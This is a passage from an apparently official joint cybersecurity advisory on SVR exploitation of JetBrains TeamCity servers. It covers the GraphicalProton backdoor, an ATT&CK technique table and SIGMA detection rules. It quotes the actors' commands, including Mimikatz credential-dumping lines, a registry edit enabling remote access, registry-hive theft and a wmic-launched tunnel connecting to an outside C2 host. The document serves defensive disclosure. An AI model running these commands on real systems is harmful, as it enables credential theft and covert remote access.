href=\"https://attack.mitre.org/versions/v14/techniques/T1210/\" title=\"Exploitation of Remote Services\">T1210</a>].</p>\n<ul><li>wmic /node:\"\"&lt;redacted&gt;\"\" /user:\"\"&lt;redacted&gt;\" /password:\"\"&lt;redacted&gt;\"\" process call create \"\"rundll32 C:\\Windows\\system32\\AclNumsInvertHost.dll AclNumsInvertHost\"\"</li>\n</ul><p>The SVR also modified DisableRestrictedAdmin key to enable remote connections [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1210/\">T1210</a>].</p>\n<p>It modified Registry using the following reg command:</p>\n<ul><li>reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d \"0\" /f</li>\n</ul><h4><em><strong>Adversary Toolset</strong></em></h4>\n<p>In the course of the TeamCity operation, the SVR used multiple custom and open source available tools and backdoors. The following custom tools were observed in use during the operation:</p>\n<ul><li><strong>GraphicalProton</strong> is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1027/001/\" title=\"Obfuscated Files or Information: Binary Padding\">T1027.001</a>] to exchange data with the SVR operator.</li>\n<li>After execution, GraphicalProton gathers environment information such as active TCP/UDP connections [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1049/\" title=\"System Network Connections Discovery\">T1049</a>], running processes [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1049/\" title=\"System Network Connections Discovery\">T1049</a>], as well as user, host, and domain names [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1590/\" title=\"Gather Victim Network Information\">T1590</a>]. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/\" title=\"Exfiltration Over Web Service\">T1567</a>]. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1564/001/\" title=\"Hide Artifacts: Hidden Files and Directories\">T1564.001</a>]. Directory name is re-randomized each time the GraphicalProton process is started.</li>\n<li>BMP files that were used to exchange data were generated in the following way:</li>\n</ul><ol><li>Compress data using zlib,</li>\n<li>Encrypt data using custom algorithm,</li>\n<li>Add “***” string literal to encrypted data,</li>\n<li>Create a random BMP with random rectangle,</li>\n<li>And finally, encode encrypted data within lower pixel bits.</li>\n</ol><p>While the GraphicalProton backdoor has remained mostly unchanged over the months we have been tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation, encryption, encoders, and stagers. Two specific variants of GraphicalProton “packaging” are especially noteworthy – a variant that uses DLL hijacking [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1574/002/\" title=\"Hijack Execution Flow: DLL Side-Loading\">T1574.002</a>] in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1036/\" title=\"Masquerading\">T1036</a>], an open-source C++ build analysis tool from Microsoft.</p>\n<ul><li><strong>GraphicalProton HTTPS variant </strong>– a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on HTTP request.<br />\n\tTo legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files – stager and encrypted binary file that contains further code.</li>\n</ul><div>\n<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>\n<p>See below tables for all referenced threat actor tactics and techniques in this advisory. For additional mitigations, see the Mitigations section.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 1: SVR Cyber Actors ATT&amp;CK Techniques for Enterprise - Reconnaissance</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Gather Victim Network Information: Network Topology</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1590/004/\" title=\"Gather Victim Network Information: Network Topology\">T1590.004</a></p>\n</td>\n<td>\n<p>SVR cyber actors may gather information about the victim’s network topology that can be used during targeting.</p>\n</td>\n</tr><tr><td>\n<p>Gather Victim Host Information: Software</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1592/002/\" title=\"Gather Victim Host Information: Software\">T1592.002</a></p>\n</td>\n<td>\n<p>SVR cyber actors may gather information about the victim’s host networks that can be used during targeting.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 2: SVR Cyber Actors’ ATT&amp;CK Techniques for Enterprise – Initial Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Exploit Public-Facing Application</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></p>\n</td>\n<td>\n<p>SVR cyber actors exploit internet-connected JetBrains TeamCity server using CVE-2023-42793 for initial access.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 3: SVR Cyber Actors’ ATT&amp;CK Techniques for Enterprise: Execution</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Command and Scripting Interpreter: PowerShell</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a></p>\n</td>\n<td>\n<p>SVR cyber actors used powershell commands to compress Microsoft SQL server .dll files.</p>\n</td>\n</tr><tr><td>\n<p>Command and Scripting Interpreter: Windows Command Shell</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/003/\" title=\"Command and Scripting Interpreter: Windows Command Shell\">T1059.003</a></p>\n</td>\n<td>\n<p>SVR cyber actors execute these powershell commands to perform host reconnaissance:</p>\n<ul><li>powershell ([adsisearcher]\"((samaccountname=&lt;redacted&gt;))\").Findall().Properties</li>\n<li>powershell ([adsisearcher]\"((samaccountname=&lt;redacted&gt;))\").Findall().Properties.memberof</li>\n<li>powershell Get-WmiObject -Class Win32_Service -Computername</li>\n<li>powershell Get-WindowsDriver -Online -All</li>\n</ul></td>\n</tr><tr><td>\n<p>Exploitation for Client Execution</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1203/\" title=\"Exploitation for Client Execution\">T1203</a></p>\n</td>\n<td>\n<p>SVR cyber actors leverage arbitrary code execution after exploiting CVE-2023-42793.</p>\n</td>\n</tr><tr><td>\n<p>Hijack Execution Flow: DLL Side-Loading</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1574/002/\" title=\"Hijack Execution Flow: DLL Side-Loading\">T1574.002</a></p>\n</td>\n<td>\n<p>SVR cyber actors use a variant of GraphicalProton that uses DLL hijacking in Zabbix as a means to start execution.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 4: SVR Cyber Actors’ ATT&amp;CK Techniques for Enterprise: Persistence</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Scheduled Task</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1053/005/\" title=\"Scheduled Task\">T1053.005</a></p>\n</td>\n<td>\n<p>SVR cyber actors may abuse Windows Task Schedule to perform task scheduling for initial or recurring execution of malicious code.</p>\n</td>\n</tr><tr><td>\n<p>Server Software Component: SQL Stored Procedures</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1505/001/\" title=\"Server Software Component: SQL Stored Procedures\">T1505.001</a></p>\n</td>\n<td>\n<p>SVR cyber actors abuse SQL server stored procedures to maintain persistence.</p>\n</td>\n</tr><tr><td>\n<p>Boot or Logon Autostart Execution</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1547/\" title=\"Boot or Logon Autostart Execution\">T1547</a></p>\n</td>\n<td>\n<p>SVR cyber actors used C:\\Windows\\system32\\ntoskrnl.exe to configure automatic system boot settings to maintain persistence.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 5: SVR Cyber Actors’ ATT&amp;CK Techniques for Enterprise: Privilege Escalation</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Exploitation for Privilege Escalation</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a></p>\n</td>\n<td>\n<p>SVR cyber actors exploit JetBrains TeamCity vulnerability to achieve escalated privileges.</p>\n<p>To avoid detection, the SVR cyber actors used a “Bring Your Own Vulnerable Driver”  technique to disable EDR and AV defense mechanisms.</p>\n</td>\n</tr><tr><td>\n<p>Account Manipulation</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1098/\" title=\"Account Manipulation\">T1098</a></p>\n</td>\n<td>\n<p>SVR cyber actors may manipulate accounts to maintain and/or elevate access to victim systems.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 6: SVR Cyber Actors’ ATT&amp;CK Techniques for Enterprise: Defense Evasion</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Obfuscated Files or Information: Binary Padding</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1027/001/\" title=\"Obfuscated Files or Information: Binary Padding\">T1027.001</a></p>\n</td>\n<td>\n<p>SVR cyber actors use BMPs to perform binary padding while exchange data is exfiltrated to an their C2 station.</p>\n</td>\n</tr><tr><td>\n<p>Masquerading</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1036/\" title=\"Masquerading\">T1036</a></p>\n</td>\n<td>\n<p>SVR cyber actors use a variant that uses DLL hijacking<u> </u>in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf, an open-source C++ build analysis tool from Microsoft.</p>\n</td>\n</tr><tr><td>\n<p>Process Injection</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1055/\" title=\"Process Injection\">T1055</a></p>\n</td>\n<td>\n<p>SVR cyber actors inject code into AV and EDR processes to evade defenses.</p>\n</td>\n</tr><tr><td>\n<p>Disable or Modify Tools</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001/\" title=\"Disable or Modify Tools\">T1562.001</a></p>\n</td>\n<td>\n<p>SVR cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.</p>\n</td>\n</tr><tr><td>\n<p>Hide Artifacts</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1564/\" title=\"Hide Artifacts\">T1564</a></p>\n</td>\n<td>\n<p>SVR cyber actors may attempt to hide artifacts associated with their behaviors to evade detection.</p>\n</td>\n</tr><tr><td>\n<p>Hide Artifacts: Hidden Files and Directories</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1564/001/\" title=\"Hide Artifacts: Hidden Files and Directories\">T1564.001</a></p>\n</td>\n<td>\n<p>When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 7: SVR Cyber actors’ ATT&amp;CK Techniques for Enterprise: Credential Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>OS Credential Dumping: LSASS Memory</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a></p>\n</td>\n<td>\n<p>SVR cyber actors executed Mimikatz commands in memory to gain access to credentials stored in memory.</p>\n</td>\n</tr><tr><td>\n<p>OS Credential Dumping: Security Account Manager</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a></p>\n</td>\n<td>\n<p>SVR cyber actors used:</p>\n<ul><li>privilege::debug</li>\n<li>lsadump::cache</li>\n<li>lsadump::secrets</li>\n<li>lsadump::sam</li>\n<li>sekurlsa::logonpasswords</li>\n</ul><p>Mimikatz commands to gain access to credentials.</p>\n<p>Additionally, SVR cyber actors exfiltrated Windows registry hives to steal credentials.</p>\n<ul><li>HKLM\\SYSTEM</li>\n<li>HKLM\\SAM</li>\n<li>HKLM\\SECURITY</li>\n</ul></td>\n</tr><tr><td>\n<p>Credentials from Password Stores: Credentials from Web Browsers</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1555/003/\" title=\"Credentials from Password Stores: Credentials from Web Browsers\">T1555.003</a></p>\n</td>\n<td>\n<p>In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.</p>\n</td>\n</tr><tr><td>\n<p>Steal or Forge Kerberos Tickets: Golden Ticket</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1558/001/\" title=\"Steal or Forge Kerberos Tickets: Golden Ticket\">T1558.001</a></p>\n</td>\n<td>\n<p>To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs).</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 8: SVR Cyber Actors ATT&amp;CK Techniques for Enterprise: Discovery</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>System Owner/User Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1033/\" title=\"System Owner/User Discovery\">T1033</a></p>\n</td>\n<td>\n<p>SVR cyber actors use these built-in commands to perform host reconnaissance: whoami /priv, whoami / all, whoami / groups, whoami / domain to perform user discovery.</p>\n</td>\n</tr><tr><td>Network Service Discovery</td>\n<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a></td>\n<td>SVR cyber actors performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit.</td>\n</tr><tr><td>\n<p>Process Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1057/\" title=\"Process Discovery\">T1057</a></p>\n</td>\n<td>\n<p>SVR cyber actors use GraphicalProton to gather running processes data.</p>\n</td>\n</tr><tr><td>\n<p>Gather Victim Network Information</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1590/\" title=\"Gather Victim Network Information\">T1590</a></p>\n</td>\n<td>\n<p>SVR cyber actors use GraphicalProton to gather victim network information.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 9: SVR Cyber Actors ATT&amp;CK Techniques for Enterprise: Lateral Movement</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Exploitation of Remote Services</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1210/\" title=\"Exploitation of Remote Services\">T1210</a></p>\n</td>\n<td>\n<p>SVR cyber actors may exploit remote services to gain unauthorized access to internal systems once inside a network.</p>\n</td>\n</tr><tr><td>\n<p>Windows Management Instrumentation</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1047/\" title=\"Windows Management Instrumentation\">T1047</a></p>\n</td>\n<td>\n<p>SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads.</p>\n<p>wmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat Protection\\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31\"</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 10: SVR Cyber Actors ATT&amp;CK Techniques for Enterprise: Command and Control</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Dynamic Resolution</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1568/\" title=\"Dynamic Resolution\">T1568</a></p>\n</td>\n<td>\n<p>SVR may dynamically establish connections to command-and-control infrastructure to evade common detections and remediations.</p>\n</td>\n</tr><tr><td>\n<p>Protocol Tunneling</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></p>\n</td>\n<td>\n<p>SVR cyber actors may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.</p>\n<p>In selected environments, the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstunm—to establish a tunnel to the C2 infrastructure.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 11: SVR Cyber Actors ATT&amp;CK Techniques for Enterprise: Exfiltration</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Automated Exfiltration</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1020/\" title=\"Automated Exfiltration\">T1020</a></p>\n</td>\n<td>\n<p>SVR cyber actors may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during collection.</p>\n</td>\n</tr><tr><td>\n<p>Exfiltration Over C2 Channel</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1041/\" title=\"Exfiltration Over C2 Channel\">T1041</a></p>\n</td>\n<td>\n<p>SVR cyber actors may steal data by exfiltrating it over an existing C2 channel. Stolen data is encoded into normal communications using the same protocol as C2 communications.</p>\n</td>\n</tr><tr><td>\n<p>Exfiltration Over Web Service</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/\" title=\"Exfiltration Over Web Service\">T1567</a></p>\n</td>\n<td>\n<p>SVR cyber actors use OneDrive and Dropbox to exfiltrate data to their C2 station.</p>\n</td>\n</tr></tbody></table><h3><strong>INDICATORS OF COMPROMISE</strong></h3>\n<p><em><strong>Note:</strong> Please refer to Appendix B for a list of IOCs.</em></p>\n<h3><strong>VICTIM TYPES</strong></h3>\n<p>As a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC have identified a few dozen compromised companies in the United States, Europe, Asia, and Australia, and are aware of over a hundred compromised devices though we assess this list does not represent the full set of compromised organizations. Generally, the victim types do not fit into any sort of pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server, leading to the assessment that SVR’s exploitation of these victims’ networks was opportunistic in nature and not necessarily a targeted attack. Identified victims included: an energy trade association; companies that provide software for billing, medical devices, customer care, employee monitoring, financial management, marketing, sales, and video games; as well as hosting companies, tools manufacturers, and small and large IT companies.</p>\n<h3><strong>DETECTION METHODS</strong></h3>\n<p>The following rules can be used to detect activity linked to adversary activity. These rules should serve as examples and adapt to each organization’s environment and telemetry.</p>\n<h4><strong>SIGMA Rules</strong></h4>\n<table><tbody><tr><td>\n<p><code>title: Privilege information listing via whoami<br />\n\t\t\tdescription: Detects whoami.exe execution and listing of privileges<br />\n\t\t\tauthor: <br />\n\t\t\treferences: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami<br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: process_creation<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        Image|endswith:<br />\n\t\t\t          - 'whoami.exe'<br />\n\t\t\t        CommandLine|contains:<br />\n\t\t\t          - 'priv'<br />\n\t\t\t          - 'PRIV'<br />\n\t\t\t    condition: selection<br />\n\t\t\tfalsepositives: legitimate use by system administrator</code></p>\n<p>\n\t\t\t<code>title: DC listing via nltest<br />\n\t\t\tdescription: Detects nltest.exe execution and DC listing<br />\n\t\t\tauthor: <br />\n\t\t\treferences:<br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: process_creation<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        Image|endswith:<br />\n\t\t\t          - 'nltest.exe'<br />\n\t\t\t        CommandLine|re: '.*dclist\\:.*|.*DCLIST\\:.*|.*dsgetdc\\:.*|.*DSGETDC\\:.*'<br />\n\t\t\t    condition: selection<br />\n\t\t\tfalsepositives: legitimate use by system administrator</code></p>\n<p><code>title: DLL execution via WMI<br />\n\t\t\tdescription: Detects DLL execution via WMI<br />\n\t\t\tauthor: <br />\n\t\t\treferences:<br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: process_creation<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        Image|endswith:<br />\n\t\t\t          - 'WMIC.exe'<br />\n\t\t\t        CommandLine|contains|all:<br />\n\t\t\t          - 'call'<br />\n\t\t\t          - 'rundll32'<br />\n\t\t\t    condition: selection<br />\n\t\t\tfalsepositives: legitimate use by software or system administrator</code></p>\n<p><code>title: Process with connect and pass as args<br />\n\t\t\tdescription: Process with connect and pass as args<br />\n\t\t\tauthor:<br />\n\t\t\treferences:<br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: process_creation<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        CommandLine|contains|all:<br />\n\t\t\t          - 'pass'<br />\n\t\t\t          - 'connect'<br />\n\t\t\t    condition: selection<br />\n\t\t\tfalsepositives: legitimate use of rsockstun or software with exact same arguments</code></p>\n<p><code>title: Service or Drive enumeration via powershell<br />\n\t\t\tdescription: Service or Drive enumeration via powershell <br />\n\t\t\tauthor: <br />\n\t\t\treferences:<br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: ps_script<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection_1:<br />\n\t\t\t            ScriptBlockText|contains|all:<br />\n\t\t\t            - 'Get-WmiObject'<br />\n\t\t\t            - '-Class'<br />\n\t\t\t            - 'Win32_Service'<br />\n\t\t\t    selection_2:<br />\n\t\t\t            ScriptBlockText|contains|all:<br />\n\t\t\t            - 'Get-WindowsDriver'<br />\n\t\t\t            - '-Online'<br />\n\t\t\t            - '-All'<br />\n\t\t\t    condition: selection_1 or selection_2<br />\n\t\t\tfalsepositives: legitimate use by system administrator</code></p>\n<p><code>title: Compressing files from temp to temp<br />\n\t\t\tdescription: Compressing files from temp\\ to temp used by SVR to prepare data to be exfiltrated<br />\n\t\t\treferences:<br />\n\t\t\tauthor: <br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: ps_script<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        ScriptBlockText|re: '.*Compress\\-Archive.*Path.*Windows\\\\[Tt]{1}emp\\\\[1-9]{1}.*DestinationPath.*Windows\\\\[Tt]{1}emp\\\\.*'<br />\n\t\t\t    condition: selection</code></p>\n<p>\n\t\t\t<code>title: DLL names used by SVR for GraphicalProton backdoor<br />\n\t\t\tdescription: Hunts for known SVR-specific DLL names.<br />\n\t\t\treferences:<br />\n\t\t\tauthor: <br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: image_load<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        ImageLoaded|endswith:<br />\n\t\t\t          - 'AclNumsInvertHost.dll'<br />\n\t\t\t          - 'ModeBitmapNumericAnimate.dll'<br />\n\t\t\t          - 'UnregisterAncestorAppendAuto.dll'<br />\n\t\t\t          - 'DeregisterSeekUsers.dll'<br />\n\t\t\t          - 'ScrollbarHandleGet.dll'<br />\n\t\t\t          - 'PerformanceCaptionApi.dll'<br />\n\t\t\t          - 'WowIcmpRemoveReg.dll'<br />\n\t\t\t          - 'BlendMonitorStringBuild.dll'<br />\n\t\t\t          - 'HandleFrequencyAll.dll'<br />\n\t\t\t          - 'HardSwapColor.dll'<br />\n\t\t\t          - 'LengthInMemoryActivate.dll'<br />\n\t\t\t          - 'ParametersNamesPopup.dll'<br />\n\t\t\t          - 'ModeFolderSignMove.dll'<br />\n\t\t\t          - 'ChildPaletteConnected.dll'<br />\n\t\t\t          - 'AddressResourcesSpec.dll'<br />\n\t\t\t    condition: selection</code></p>\n<p>\n\t\t\t<code>title: Sensitive registry entries saved to file<br />\n\t\t\tdescription: Sensitive registry entries saved to file<br />\n\t\t\tauthor: <br />\n\t\t\treferences:<br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: process_creation<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection_base:<br />\n\t\t\t        Image|endswith:<br />\n\t\t\t          - 'reg.exe'<br />\n\t\t\t        CommandLine|contains: 'save'<br />\n\t\t\t        CommandLine|re: '.*HKLM\\\\SYSTEM.*|.*HKLM\\\\SECURITY.*|.*HKLM\\\\SAM.*'<br />\n\t\t\t    selection_file:<br />\n\t\t\t      CommandLine|re: '.*sy\\.sa.*|.*sam\\.sa.*|.*se\\.sa.*'<br />\n\t\t\t    condition: selection_base and selection_file</code></p>\n<p><code>title: Scheduled tasks names used by SVR for GraphicalProton backdoor<br />\n\t\t\tdescription: Hunts for known SVR-specific scheduled task names<br />\n\t\t\tauthor: <br />\n\t\t\treferences: <br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: taskscheduler<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        EventID:<br />\n\t\t\t          - 4698<br />\n\t\t\t          - 4699<br />\n\t\t\t          - 4702<br />\n\t\t\t        TaskName:<br />\n\t\t\t          - '\\Microsoft\\Windows\\IISUpdateService'<br />\n\t\t\t          - '\\Microsoft\\Windows\\WindowsDefenderService'<br />\n\t\t\t          - '\\Microsoft\\Windows\\WindowsDefenderService2'<br />\n\t\t\t          - 